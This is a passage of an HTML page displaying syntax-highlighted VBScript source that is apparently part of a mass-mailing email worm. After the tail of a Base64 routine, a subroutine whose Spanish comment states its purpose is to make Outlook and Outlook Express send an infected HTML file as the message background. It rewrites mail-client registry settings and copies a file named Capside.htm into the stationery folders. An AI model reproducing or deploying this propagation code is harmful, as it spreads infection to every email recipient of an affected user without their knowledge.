</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc7">FileIn</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">B64</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sResult</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Sub para configurar el Outlook express y el Microssoft outlook
'para que envien como fondo de mensage un archivo html infectado
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Vfirmas</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Ov</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Us</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_CURRENT_USER\Identities\Default User ID"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Ov</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"5.0"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Ov</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Outlook Express\MediaVer"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".0"</span><span class="sc0">
</span><span class="sc7">Rout</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Identities\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Us</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Software\Microsoft\Outlook Express\"</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ov</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc7">Rout</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ov</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Mail\Message Send HTML"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc7">Rout</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ov</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Mail\Compose Use Stationery"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc7">Rout</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ov</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Mail\Wide Stationery Name"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc7">Rout</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ov</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Mail\Stationery Name"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">Spq</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery\Backgrounds Folder"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Spq</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Spq</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery\Stationery Folder"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Spq</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Cf.FolderExists</span><span class="sc6">(</span><span class="sc4">"C:\Archivos de programa\Archivos comunes\Microsoft Shared\Stationery"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Spq</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\Archivos de programa\Archivos comunes\Microsoft Shared\Stationery"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Spq</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">F.FolderExists</span><span class="sc6">(</span><span class="sc4">"C:\Program Files\Common Files\Microsoft Shared\Stationery"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Spq</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\Program Files\Common Files\Microsoft Shared\Stationery"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Out</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Out</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"8.0"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Out</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"9.0"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Out</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"10.0"</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Out</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Out</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Outlook\Options\Mail\EditorPreference"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">131072</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">Dp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\DefaultProfile"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Common\MailSettings\NewStationery"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Capside"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Dp</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\0a0d020000000000c000000000000046\001e0360"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Capside"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Dp</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\0a0d020000000000c000000000000046\001e0360"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Capside"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">

</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Common\MailSettings\NewStationery"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Capside"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Capside"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Capside"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">

</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.htm"</span><span class="sc0">
</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Spq</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.htm"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span></div></body>
</html>
